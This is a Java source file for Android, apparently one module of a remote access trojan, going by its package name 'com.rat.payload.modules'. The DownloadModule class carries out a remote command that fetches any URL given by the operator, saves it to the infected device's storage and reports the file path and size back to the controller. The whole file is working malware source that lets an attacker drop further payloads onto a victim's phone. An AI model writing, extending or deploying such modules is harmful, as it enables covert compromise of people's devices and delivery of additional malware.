package com.rat.payload.modules;

import android.content.Context;
import android.os.Environment;
import android.util.Log;

import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class DownloadModule implements CommandHandler.Command {

    private static final String TAG = "DownloadModule";
    private Context context;

    public DownloadModule(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    @Override
    public JSONObject execute(JSONObject args) {
        JSONObject result = new JSONObject();
        try {
            String url = args.getString("url");
            String filename = args.optString("filename", "download_" + System.currentTimeMillis());
            File outputDir = context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS);
            File outputFile = new File(outputDir, filename);

            URL downloadUrl = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) downloadUrl.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(30000);

            InputStream in = conn.getInputStream();
            FileOutputStream out = new FileOutputStream(outputFile);
            byte[] buffer = new byte[8192];
            int read;
            while ((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
            }
            out.close();
            in.close();

            result.put("downloaded", true);
            result.put("path", outputFile.getAbsolutePath());
            result.put("size", outputFile.length());
        } catch (Exception e) {
            Log.e(TAG, "download error: " + e.getMessage());
            try { result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }
}
